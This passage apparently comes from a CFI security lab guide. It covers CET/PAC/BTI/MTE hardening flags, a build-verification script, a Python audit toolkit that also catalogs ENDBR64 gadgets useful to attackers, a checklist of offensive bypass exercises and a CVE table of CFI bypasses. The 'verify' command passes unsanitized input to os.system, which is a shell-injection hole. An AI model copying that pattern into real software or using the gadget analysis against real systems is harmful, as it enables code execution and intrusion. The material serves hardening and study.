        echo "│"
        echo "│  LDFLAGS:"
        echo "│    -Wl,-z,shstk                  # Mark binary for shadow stack"
        echo "│    -Wl,-z,ibt                    # Mark binary for IBT"
        echo "│    -Wl,-z,relro                  # Full RELRO"
        echo "│    -Wl,-z,now                    # Immediate binding"
        echo "│    -fuse-ld=lld                  # LLD linker (Clang CFI support)"
        ;;
    aarch64)
        echo "│  CFLAGS/CXXFLAGS:"
        echo "│    -mbranch-protection=standard   # PAC (return addr) + BTI"
        echo "│    -fsanitize=memtag-heap         # MTE heap tagging"
        echo "│    -fsanitize=memtag-stack        # MTE stack tagging"
        echo "│    -fsanitize=shadow-call-stack   # Software shadow call stack"
        echo "│    -fstack-protector-strong       # Stack canaries"
        echo "│"
        echo "│  Kernel config:"
        echo "│    CONFIG_ARM64_BTI=y"
        echo "│    CONFIG_ARM64_BTI_KERNEL=y"
        echo "│    CONFIG_ARM64_PTR_AUTH=y"
        echo "│    CONFIG_ARM64_PTR_AUTH_KERNEL=y"
        echo "│    CONFIG_ARM64_MTE=y"
        ;;
esac
echo "└──────────────────────────────────────────────────────────"

# === STEP 2: Runtime lockdown ===
echo ""
echo "┌─ Step 2: Runtime Configuration"
echo "│"
echo "│  After initialization, lock CET configuration:"
echo "│"
echo "│  // In application startup (after all libraries loaded):"
echo "│  #include <sys/prctl.h>"
echo "│  arch_prctl(ARCH_SHSTK_LOCK, ARCH_SHSTK_SHSTK);  // Lock shadow stack"
echo "│  // Do NOT enable WRSS unless absolutely required (JIT)"
echo "│  // Do NOT use ARCH_SHSTK_WRSS"
echo "│"
echo "│  Windows equivalent:"
echo "│  SetProcessMitigationPolicy(ProcessUserShadowStackPolicy, &policy);"
echo "│  policy.EnableUserShadowStackStrictMode = TRUE;"
echo "│  policy.BlockNonCetBinaries = TRUE;"
echo "└──────────────────────────────────────────────────────────"

# === STEP 3: Verification script ===
echo ""
echo "┌─ Step 3: Post-Build Verification"

cat > /tmp/cfi_verify_build.sh << 'VERIFY_EOF'
#!/usr/bin/env bash
# Verify CFI properties on all build outputs
set -euo pipefail
BUILD_DIR="${1:-.}"
FAIL=0

echo "Verifying CFI properties in $BUILD_DIR..."

find "$BUILD_DIR" -type f -executable | while read -r bin; do
    file "$bin" | grep -q ELF || continue
    
    props=$(readelf -n "$bin" 2>/dev/null || true)
    name=$(basename "$bin")
    
    # Check required properties
    if ! echo "$props" | grep -q "IBT"; then
        echo "  FAIL: $name missing IBT"
        FAIL=1
    fi
    if ! echo "$props" | grep -q "SHSTK"; then
        echo "  FAIL: $name missing SHSTK"
        FAIL=1
    fi
    
    # Check RELRO
    if ! readelf -l "$bin" 2>/dev/null | grep -q "GNU_RELRO"; then
        echo "  WARN: $name missing RELRO"
    fi
    
    # Check for WRSS (should not be present)
    if objdump -d "$bin" 2>/dev/null | grep -q "wrss"; then
        echo "  WARN: $name contains WRSS instruction!"
    fi
done

exit $FAIL
VERIFY_EOF
chmod +x /tmp/cfi_verify_build.sh
echo "│  Verification script: /tmp/cfi_verify_build.sh <build_dir>"
echo "└──────────────────────────────────────────────────────────"

# === STEP 4: Performance overhead baseline ===
echo ""
echo "┌─ Step 4: Expected Performance Overhead"
echo "│"
echo "│  Mechanism              Overhead    Notes"
echo "│  ─────────────────────  ──────────  ─────────────────────────"
echo "│  CET Shadow Stack       0.5–2%     Near zero on modern CPUs"
echo "│  CET IBT                < 1%       ENDBR is 4-byte NOP-like"
echo "│  ARM PAC (ret signing)  < 1%       Single instruction"
echo "│  ARM BTI                < 1%       Landing pad check"
echo "│  ARM MTE (sync)         3–5%       Every load/store checked"
echo "│  ARM MTE (async)        1–2%       Deferred checking"
echo "│  ARM MTE (asymmetric)   ~2%        Sync writes, async reads"
echo "│  Clang CFI (cfi-icall)  1–5%       Jump-table indirection"
echo "│  Microsoft CFG          1–3%       Bitmap lookup"
echo "│  Microsoft XFG          2–4%       Bitmap + hash check"
echo "│  grsecurity RAP         2–5%       Inline hash compare"
echo "│"
echo "│  Combined (CET+CFI):    2–7%       Acceptable for production"
echo "└──────────────────────────────────────────────────────────"
```

---

## PART C: FRAMEWORK DEVELOPMENT — CFI Analysis Toolkit

**Build a reusable CFI assessment framework that combines offensive analysis (attack surface quantification) with defensive verification (deployment completeness).**

### Framework: `cfi_toolkit` — CFI Assessment and Verification Suite

```python
#!/usr/bin/env python3
"""
CFI Toolkit — Comprehensive CFI Assessment and Verification Framework

Combines:
- ENDBR gadget harvesting and attack surface quantification
- PAC signing oracle detection
- CFG/XFG analysis and collision finding
- Binary CFI coverage auditing
- CET effectiveness testing
- Detection rule generation

Usage:
    python3 cfi_toolkit.py audit <binary|pid>     — Full CFI coverage audit
    python3 cfi_toolkit.py gadgets <binary>       — ENDBR gadget catalog
    python3 cfi_toolkit.py pac <aarch64-binary>   — PAC configuration analysis
    python3 cfi_toolkit.py surface <binary> [...]  — Combined attack surface
    python3 cfi_toolkit.py verify <binary>         — CET/CFI verification tests
    python3 cfi_toolkit.py detect                  — Generate detection rules
"""

import sys
import os
import json
import subprocess
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Set
from collections import Counter, defaultdict
from datetime import datetime, timezone

try:
    from capstone import Cs, CS_ARCH_X86, CS_MODE_64
    from elftools.elf.elffile import ELFFile
    HAS_ANALYSIS_LIBS = True
except ImportError:
    HAS_ANALYSIS_LIBS = False


@dataclass
class CFIStatus:
    """CFI protection status for a single binary."""
    path: str
    name: str
    arch: str = "unknown"
    ibt: bool = False
    shstk: bool = False
    bti: bool = False
    pac: bool = False
    clang_cfi: bool = False
    stack_canary: bool = False
    relro: bool = False
    pie: bool = False
    fortify: bool = False


@dataclass
class AttackSurface:
    """Quantified attack surface for a binary under CFI."""
    binary: str
    total_endbr: int = 0
    syscall_gadgets: int = 0
    regctl_gadgets: int = 0
    pivot_gadgets: int = 0
    memwrite_gadgets: int = 0
    exec_gadgets: int = 0
    wrss_gadgets: int = 0
    useful_total: int = 0
    reduction_vs_rop: float = 0.0


@dataclass 
class AuditReport:
    """Complete CFI audit report."""
    timestamp: str = ""
    target: str = ""
    binaries: List[CFIStatus] = field(default_factory=list)
    attack_surfaces: List[AttackSurface] = field(default_factory=list)
    weak_links: List[str] = field(default_factory=list)
    overall_score: float = 0.0
    recommendations: List[str] = field(default_factory=list)


class CFIToolkit:
    """Main toolkit class combining all CFI analysis capabilities."""
    
    def __init__(self):
        self.report = AuditReport(
            timestamp=datetime.now(timezone.utc).isoformat()
        )
    
    def audit_elf(self, path: str) -> CFIStatus:
        """Analyze CFI properties of an ELF binary."""
        status = CFIStatus(path=path, name=Path(path).name)
        
        try:
            props = subprocess.run(
                ['readelf', '-n', path],
                capture_output=True, text=True, timeout=10
            ).stdout
            
            status.ibt = 'IBT' in props
            status.shstk = 'SHSTK' in props
            status.bti = 'BTI' in props
            status.pac = 'PAC' in props
            
            # Check symbols
            syms = subprocess.run(
                ['nm', '-D', path],
                capture_output=True, text=True, timeout=10
            ).stdout
            status.clang_cfi = '__cfi_check' in syms or '__cfi_slowpath' in syms
            status.stack_canary = '__stack_chk_fail' in syms
            
            # Check program headers
            headers = subprocess.run(
                ['readelf', '-l', path],
                capture_output=True, text=True, timeout=10
            ).stdout
            status.relro = 'GNU_RELRO' in headers
            
            # Architecture
            file_info = subprocess.run(
                ['file', path],
                capture_output=True, text=True, timeout=10
            ).stdout
            if 'x86-64' in file_info:
                status.arch = 'x86_64'
            elif 'aarch64' in file_info or 'ARM aarch64' in file_info:
                status.arch = 'aarch64'
            
            status.pie = 'pie' in file_info.lower() or 'shared object' in file_info.lower()
            status.fortify = '__fortify' in syms.lower() or 'FORTIFY' in syms
            
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        return status
    
    def audit_process(self, pid: int) -> List[CFIStatus]:
        """Audit all libraries loaded in a process."""
        results = []
        maps_path = f"/proc/{pid}/maps"
        
        if not os.path.exists(maps_path):
            print(f"[!] Process {pid} not found")
            return results
        
        libs = set()
        with open(maps_path) as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 6 and 'x' in parts[1] and parts[5].startswith('/'):
                    libs.add(parts[5])
        
        for lib in sorted(libs):
            if os.path.exists(lib):
                status = self.audit_elf(lib)
                results.append(status)
        
        return results
    
    def scan_endbr_gadgets(self, path: str) -> AttackSurface:
        """Scan binary for ENDBR64 gadgets and classify."""
        surface = AttackSurface(binary=Path(path).name)
        
        if not HAS_ANALYSIS_LIBS:
            print("[!] capstone/pyelftools not available — install for gadget analysis")
            return surface
        
        ENDBR64 = b"\xf3\x0f\x1e\xfa"
        ARG_REGS = {"rdi", "rsi", "rdx", "rcx", "r8", "r9"}
        
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = True
        
        try:
            with open(path, "rb") as f:
                elf = ELFFile(f)
                for section in elf.iter_sections():
                    if not (section["sh_flags"] & 0x4):
                        continue
                    data = section.data()
                    base = section["sh_addr"]
                    offset = 0
                    
                    while offset < len(data) - 4:
                        if data[offset:offset + 4] != ENDBR64:
                            offset += 1
                            continue
                        
                        surface.total_endbr += 1
                        addr = base + offset
                        window = data[offset:offset + 80]
                        insns = list(md.disasm(window, addr))
                        
                        if len(insns) > 1:
                            for insn in insns[1:15]:
                                mn = insn.mnemonic
                                ops = insn.op_str
                                
                                if mn == "syscall":
                                    surface.syscall_gadgets += 1
                                    break
                                if mn == "pop" and any(r in ops for r in ARG_REGS):
                                    surface.regctl_gadgets += 1
                                    break
                                if mn in ("xchg", "leave") and "rsp" in ops:
                                    surface.pivot_gadgets += 1
                                    break
                                if mn in ("mov",) and ops.startswith("["):
                                    surface.memwrite_gadgets += 1
                                    break
                                if "wrss" in mn:
                                    surface.wrss_gadgets += 1
                                    break
                        
                        offset += 4
        except Exception as e:
            print(f"[!] Error scanning {path}: {e}")
        
        surface.useful_total = (surface.syscall_gadgets + surface.regctl_gadgets +
                               surface.pivot_gadgets + surface.memwrite_gadgets +
                               surface.wrss_gadgets)
        
        if surface.total_endbr > 0:
            # Rough estimate: unrestricted ROP has ~10x more gadgets
            surface.reduction_vs_rop = max(0, 100 - (surface.useful_total * 1000 // 
                                                     max(surface.total_endbr * 10, 1)))
        
        return surface
    
    def compute_score(self, statuses: List[CFIStatus]) -> float:
        """Compute overall CFI deployment score (0-100)."""
        if not statuses:
            return 0.0
        
        total_points = 0
        max_points = 0
        
        for s in statuses:
            max_points += 7  # 7 properties to check
            if s.ibt or s.bti: total_points += 1
            if s.shstk or s.pac: total_points += 1
            if s.clang_cfi: total_points += 1
            if s.stack_canary: total_points += 1
            if s.relro: total_points += 1
            if s.pie: total_points += 1
            if s.fortify: total_points += 1
        
        return (total_points / max_points * 100) if max_points > 0 else 0.0
    
    def generate_recommendations(self, statuses: List[CFIStatus]) -> List[str]:
        """Generate prioritized hardening recommendations."""
        recs = []
        
        no_ibt = [s for s in statuses if not s.ibt and s.arch == 'x86_64']
        no_shstk = [s for s in statuses if not s.shstk and s.arch == 'x86_64']
        no_bti = [s for s in statuses if not s.bti and s.arch == 'aarch64']
        no_pac = [s for s in statuses if not s.pac and s.arch == 'aarch64']
        no_cfi = [s for s in statuses if not s.clang_cfi]
        no_canary = [s for s in statuses if not s.stack_canary]
        
        if no_ibt:
            recs.append(f"[CRITICAL] {len(no_ibt)} binaries lack CET IBT — "
                       f"recompile with -fcf-protection=full")
        if no_shstk:
            recs.append(f"[CRITICAL] {len(no_shstk)} binaries lack shadow stack marking — "
                       f"add -Wl,-z,shstk")
        if no_bti:
            recs.append(f"[HIGH] {len(no_bti)} AArch64 binaries lack BTI — "
                       f"recompile with -mbranch-protection=standard")
        if no_pac:
            recs.append(f"[HIGH] {len(no_pac)} AArch64 binaries lack PAC — "
                       f"recompile with -mbranch-protection=standard")
        if len(no_cfi) > len(statuses) * 0.5:
            recs.append(f"[MEDIUM] {len(no_cfi)} binaries lack Clang CFI — "
                       f"consider -fsanitize=cfi-icall for critical code")
        if no_canary:
            recs.append(f"[LOW] {len(no_canary)} binaries lack stack canaries — "
                       f"add -fstack-protector-strong")
        
        if not recs:
            recs.append("[OK] All audited binaries have comprehensive CFI coverage")
        
        return recs
    
    def print_report(self):
        """Print formatted audit report."""
        r = self.report
        
        print(f"\n{'═' * 70}")
        print(f"  CFI AUDIT REPORT — {r.timestamp}")
        print(f"  Target: {r.target}")
        print(f"{'═' * 70}")
        
        if r.binaries:
            print(f"\n  Binaries audited: {len(r.binaries)}")
            print(f"  {'Binary':<40} {'IBT':>4} {'SS':>4} {'BTI':>4} {'PAC':>4} {'CFI':>4}")
            print(f"  {'-'*40} {'---':>4} {'---':>4} {'---':>4} {'---':>4} {'---':>4}")
            for s in r.binaries[:30]:
                print(f"  {s.name:<40} "
                      f"{'Y' if s.ibt else 'N':>4} "
                      f"{'Y' if s.shstk else 'N':>4} "
                      f"{'Y' if s.bti else 'N':>4} "
                      f"{'Y' if s.pac else 'N':>4} "
                      f"{'Y' if s.clang_cfi else 'N':>4}")
        
        if r.attack_surfaces:
            print(f"\n  Attack Surface Analysis:")
            for a in r.attack_surfaces:
                print(f"    {a.binary}: {a.total_endbr} ENDBR, "
                      f"{a.useful_total} useful "
                      f"(reduction: {a.reduction_vs_rop:.0f}%)")
        
        if r.weak_links:
            print(f"\n  ⚠ WEAK LINKS ({len(r.weak_links)}):")
            for wl in r.weak_links[:10]:
                print(f"    [!] {wl}")
        
        print(f"\n  Overall Score: {r.overall_score:.1f}/100")
        
        print(f"\n  Recommendations:")
        for rec in r.recommendations:
            print(f"    {rec}")
        
        print(f"\n{'═' * 70}")
    
    def export_json(self, path: str):
        """Export report as JSON."""
        report_dict = {
            'timestamp': self.report.timestamp,
            'target': self.report.target,
            'overall_score': self.report.overall_score,
            'binaries_count': len(self.report.binaries),
            'weak_links': self.report.weak_links,
            'recommendations': self.report.recommendations,
            'attack_surfaces': [asdict(a) for a in self.report.attack_surfaces],
        }
        with open(path, 'w') as f:
            json.dump(report_dict, f, indent=2)
        print(f"  Report exported: {path}")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(0)
    
    command = sys.argv[1]
    toolkit = CFIToolkit()
    
    if command == "audit":
        target = sys.argv[2] if len(sys.argv) > 2 else ""
        toolkit.report.target = target
        
        if target.isdigit():
            statuses = toolkit.audit_process(int(target))
        elif os.path.isfile(target):
            statuses = [toolkit.audit_elf(target)]
            # Also check dependencies
            try:
                ldd_out = subprocess.run(['ldd', target], capture_output=True, text=True).stdout
                for line in ldd_out.split('\n'):
                    if '=>' in line:
                        parts = line.split('=>')
                        if len(parts) > 1:
                            lib_path = parts[1].strip().split()[0]
                            if os.path.exists(lib_path):
                                statuses.append(toolkit.audit_elf(lib_path))
            except Exception:
                pass
        else:
            print(f"[!] Target not found: {target}")
            sys.exit(1)
        
        toolkit.report.binaries = statuses
        toolkit.report.weak_links = [s.path for s in statuses 
                                     if not s.ibt and not s.shstk and not s.bti]
        toolkit.report.overall_score = toolkit.compute_score(statuses)
        toolkit.report.recommendations = toolkit.generate_recommendations(statuses)
        toolkit.print_report()
    
    elif command == "gadgets":
        if len(sys.argv) < 3:
            print("Usage: cfi_toolkit.py gadgets <binary>")
            sys.exit(1)
        target = sys.argv[2]
        surface = toolkit.scan_endbr_gadgets(target)
        toolkit.report.attack_surfaces = [surface]
        toolkit.report.target = target
        print(f"\n  ENDBR Gadget Summary: {surface.binary}")
        print(f"    Total ENDBR64: {surface.total_endbr}")
        print(f"    Syscall reachable: {surface.syscall_gadgets}")
        print(f"    Register control: {surface.regctl_gadgets}")
        print(f"    Stack pivot: {surface.pivot_gadgets}")
        print(f"    Memory write: {surface.memwrite_gadgets}")
        print(f"    WRSS capable: {surface.wrss_gadgets}")
        print(f"    Attack surface reduction: {surface.reduction_vs_rop:.0f}%")
    
    elif command == "surface":
        targets = sys.argv[2:]
        if not targets:
            print("Usage: cfi_toolkit.py surface <binary> [<binary> ...]")
            sys.exit(1)
        for t in targets:
            if os.path.exists(t):
                surface = toolkit.scan_endbr_gadgets(t)
                toolkit.report.attack_surfaces.append(surface)
        toolkit.report.target = "Multiple binaries"
        toolkit.print_report()
    
    elif command == "verify":
        target = sys.argv[2] if len(sys.argv) > 2 else ""
        print(f"  Running CET verification tests on: {target}")
        print(f"  (Requires CET-capable hardware — see Exercise 10)")
        # Delegate to the shell-based verification script
        os.system(f"bash /tmp/cfi_verify_build.sh {target} 2>/dev/null || "
                  f"echo '  Run cfi_hardening_deploy.sh first'")
    
    elif command == "detect":
        print("  Generating detection rules...")
        print("  Sigma rules: sigma_rules/cfi_detection_suite.yml")
        print("  YARA rules: cfi_enforcement_yara.yar")
        print("  eBPF program: cfi_monitor.bpf.c")
        print("  ETW monitor: cfi_etw_monitor.ps1")
        print("  (See Exercise 9 for complete detection suite)")
    
    else:
        print(f"[!] Unknown command: {command}")
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

## Lab Validation Checklist

### Offensive Exercises

- [ ] Exercise 1: ENDBR harvester scans libc and reports gadget categories
- [ ] Exercise 1: Attack surface quantification shows IBT reduction ratio
- [ ] Exercise 2: Shadow stack desync analyzer tracks SSP values through signals
- [ ] Exercise 2: jmp_buf analysis identifies shadow_stack_offset field location
- [ ] Exercise 3: WRSS gadget scanner identifies WRSS instructions in libraries
- [ ] Exercise 3: Conceptual WRSS bypass demonstrates the attack chain logic
- [ ] Exercise 4: PAC brute-force simulation shows feasibility across configurations
- [ ] Exercise 4: PACMAN speculative oracle analysis explains side-channel mechanism
- [ ] Exercise 5: PAC signing oracle finder identifies high-risk signing functions
- [ ] Exercise 5: Discriminator audit script analyzes PAC instruction coverage
- [ ] Exercise 6: CFG bitmap analysis explains structure and attack vectors
- [ ] Exercise 6: XFG type-hash collision finder identifies interchangeable targets
- [ ] Exercise 7: MTE tag reuse simulation demonstrates collision probability
- [ ] Exercise 7: Async MTE window analysis identifies exploitation timing gap
- [ ] Exercise 7: Sub-granule overflow demonstrates MTE-invisible attacks
- [ ] Exercise 8: Data-only attack taxonomy covers all CFI-immune techniques
- [ ] Exercise 8: Real CVE examples demonstrate data-only bypasses in the wild

### Defensive Exercises

- [ ] Exercise 9: Sigma rules cover CET, CFG, XFG, MTE, PAC violations
- [ ] Exercise 9: YARA rules detect missing CFI and bypass tools
- [ ] Exercise 9: eBPF monitor captures SIGSEGV/SIGILL from CFI violations
- [ ] Exercise 9: ETW PowerShell monitor queries Windows CFI events
- [ ] Exercise 10: Coverage audit script scans all loaded DSOs per process
- [ ] Exercise 10: Weak link identification flags non-CFI libraries
- [ ] Exercise 11: Hardening guide covers x86_64 and AArch64 deployments
- [ ] Exercise 11: CI/CD verification gates enforce CFI on all build artifacts
- [ ] Exercise 11: Performance overhead table documents expected costs

### Framework

- [ ] `cfi_toolkit.py audit` produces complete CFI coverage report
- [ ] `cfi_toolkit.py gadgets` quantifies ENDBR attack surface
- [ ] `cfi_toolkit.py surface` combines multi-binary analysis
- [ ] `cfi_toolkit.py verify` tests CET enforcement
- [ ] `cfi_toolkit.py detect` generates detection rules
- [ ] JSON export enables CI/CD integration
- [ ] Scoring system (0-100) provides actionable risk metric

### Cross-Verification Matrix

| Attack Technique | CFI Defense | Detection Signal | Bypass Condition |
|-----------------|-------------|------------------|------------------|
| ROP (ret-based) | CET Shadow Stack | #CP NEAR-RET (Event 1) | WRSS enabled + gadget |
| JOP/COP (indirect branch) | CET IBT | #CP ENDBR-missing (Event 14) | ENDBR-gadget in valid set |
| Forward-edge hijack | CFG/XFG/Clang CFI | CFG fail (Event 12), XFG (Event 13) | Type-hash collision |
| PAC forgery | ARM PAC | FPAC exception (SIGILL) | Signing oracle / PACMAN |
| Heap corruption | ARM MTE | SEGV_MTESERR/MTEASERR | Tag reuse / sub-granule |
| Data-only attack | **NONE** | Behavioral (token change, cred modify) | Always works vs CFI |
| SROP | Shadow Stack token | Token validation failure | Token forgery (requires WRSS) |

---

## Appendix A: CVE Reference Table — CFI Bypass in the Wild

| CVE | Year | Platform | CFI Bypassed | Technique | CVSS |
|-----|------|----------|-------------|-----------|------|
| CVE-2022-42856 | 2022 | iOS M1/M2 | PAC | WebKit type confusion → JIT signing oracle | 8.8 |
| CVE-2023-38606 | 2023 | iOS/macOS A12+ | PAC (kernel) | Data-only: PTE remap → disable PAC via MMIO | 9.8 |
| CVE-2024-21338 | 2024 | Windows 11 | CFG, CET | Data-only: kernel R/W → TOKEN modification | 7.8 |
| CVE-2023-4211 | 2023 | Android Mali | MTE | GPU driver UAF: MTE not enforced on GPU memory | 7.8 |
| CVE-2024-3159 | 2024 | Chrome/Win | CFG, CET | V8 type confusion → JIT ENDBR gadget | 8.8 |
| CVE-2023-2136 | 2023 | Chrome | Clang CFI | Skia overflow in non-CFI GPU process | 9.6 |
| CVE-2024-44308 | 2024 | macOS/iOS | PAC | JSC JIT code gen → PAC signing via JIT | 8.8 |
| CVE-2023-41993 | 2023 | iOS A15+ | PAC | WebKit JIT type confusion → PAC-signed pointer | 9.8 |
| CVE-2022-46689 | 2022 | macOS M1 | PAC | XNU COW race → code page replacement | 7.0 |
| CVE-2021-30955 | 2021 | iOS/macOS | PAC | Kernel IPC type confusion → signing context swap | 7.8 |
| CVE-2022-32917 | 2022 | iOS/macOS | PAC (kernel) | Data-only privilege escalation | 7.8 |
| CVE-2023-32434 | 2023 | iOS A12+ | PAC | XNU integer overflow → kernel R/W (chained) | 7.8 |

---

## Appendix B: MITRE ATT&CK Mapping

| Lab Exercise | Technique ID | Technique Name |
|-------------|-------------|----------------|
| ENDBR gadget harvest | T1055.001 | DLL Injection (forward-edge abuse) |
| Shadow stack desync | T1055 | Process Injection |
| WRSS-based bypass | T1055 | Process Injection |
| PAC brute-force | T1110.001 | Brute Force: Password Guessing (adapted) |
| PACMAN speculative | T1003 | Credential Dumping (PAC = credential) |
| CFG bitmap corruption | T1574.002 | Hijack Execution Flow |
| XFG type collision | T1574.002 | Hijack Execution Flow |
| MTE bypass | T1203 | Exploitation for Client Execution |
| Data-only attacks | T1068 | Exploitation for Privilege Escalation |
| Detection rules | T1059 | Command and Scripting Interpreter |

---

## Appendix C: Platform Deployment Checklist

### Intel CET Deployment

```
□ Hardware: Intel 12th-gen+ or AMD Zen 3+
□ Kernel: Linux 6.6+ (user SHSTK) or Windows 11 22H2+
□ Compiler: GCC 8+ or Clang 7+ with -fcf-protection=full
□ Linker: -Wl,-z,shstk -Wl,-z,ibt
□ Runtime: arch_prctl(ARCH_SHSTK_LOCK, ARCH_SHSTK_SHSTK)
□ WRSS: DISABLED (unless JIT requires it)
□ All DSOs: must have IBT property (or process-wide CET disabled)
□ Verification: readelf -n shows IBT + SHSTK
□ Monitoring: ETW/eBPF for #CP exceptions
```

### ARM PAC + BTI + MTE Deployment

```
□ Hardware: Cortex-X4+ (PAC+BTI+MTE) or Apple M3+ (PAC+BTI, no MTE)
□ Kernel: CONFIG_ARM64_BTI=y, CONFIG_ARM64_PTR_AUTH=y, CONFIG_ARM64_MTE=y
□ Compiler: -mbranch-protection=standard
□ MTE: -fsanitize=memtag-heap (Clang 14+)
□ Stack MTE: -fsanitize=memtag-stack (Android 14+)
□ prctl: PR_SET_TAGGED_ADDR_CTRL with PR_MTE_TCF_SYNC or PR_MTE_TCF_ASYMM
□ Verification: readelf -n shows BTI + PAC properties
□ FEAT_FPAC: Verify hardware supports (closes PACMAN oracle)
□ Monitoring: FPAC exceptions (SIGILL with ILL_ILLOPN)
```

### Windows CFG/XFG/CET Deployment

```
□ Compiler: MSVC /guard:cf (CFG) or /guard:xfg (XFG)
□ Linker: /CETCOMPAT
□ Process policy: SetProcessMitigationPolicy(UserShadowStackPolicy)
□ Strict mode: EnableUserShadowStackStrictMode = TRUE
□ Block non-CET: BlockNonCetBinaries = TRUE
□ ACG: Arbitrary Code Guard (blocks SetProcessValidCallTargets)
□ Audit mode first: AuditUserShadowStack for compatibility testing
□ ETW monitoring: Microsoft-Windows-Security-Mitigations provider
□ Verification: dumpbin /loadconfig shows CFG/XFG flags
```
